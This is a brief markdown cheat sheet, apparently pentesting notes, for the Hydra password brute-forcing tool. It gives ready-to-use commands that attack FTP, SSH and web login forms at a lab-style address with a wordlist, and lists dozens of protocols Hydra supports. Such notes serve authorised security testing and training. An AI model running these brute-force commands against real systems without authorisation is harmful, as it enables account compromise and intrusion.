# Hydra

A brute force online password cracking program; a quick system login password 'hacking' tool. 

```bash
https://github.com/vanhauser-thc/thc-hydra
```

### Hydra Commands

* FTP

```bash
hydra -l user -P <WORDLIST> ftp://10.10.10.10
```

* SSH

```bash
hydra -l <USERNAME> -P <WORDLIST> 10.10.10.10 -t 4 ssh
```

* Post Web Form

```bash
hydra -l <USERNAME> -P <WORDLIST> 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### Supported Protocols for Brute Force

* Asterisk
* AFP
* Cisco AAA
* Cisco auth
* Cisco enable
* CVS
* Firebird
* FTP
* HTTP-FORM-GET
* HTTP-FORM-POST
* HTTP-GET
* HTTP-HEAD
* HTTP-PROXY
* HTTPS-FORM-GET
* HTTPS-FORM-GET
* HTTPS-GET
* HTTPS-HEAD
* HTTPS-POST
* HTTP-Proxy
* ICQ
* IMAP
* IRC
* LDAP
* MS-SQL
* NCP
* NNTP
* Oracle Listener
* Oracle SID
* Oracle
* PC-Anywhere
* PCNFS
* POP3
* POSTGRES
* RDP
* Rexec
* Rlogin
* Rsh
* RTSP
* SAP/R3
* SIP
* SMB
* SMTP
* SMTP Enum
* SNMP v1+v2+v3
* SOCKS5, SSH (v1 and v2)
* SSHKEY
* Subversion
* Teamspeak (TS@)
* Telnet
* VMware-Auth
* VNC
* XMPP
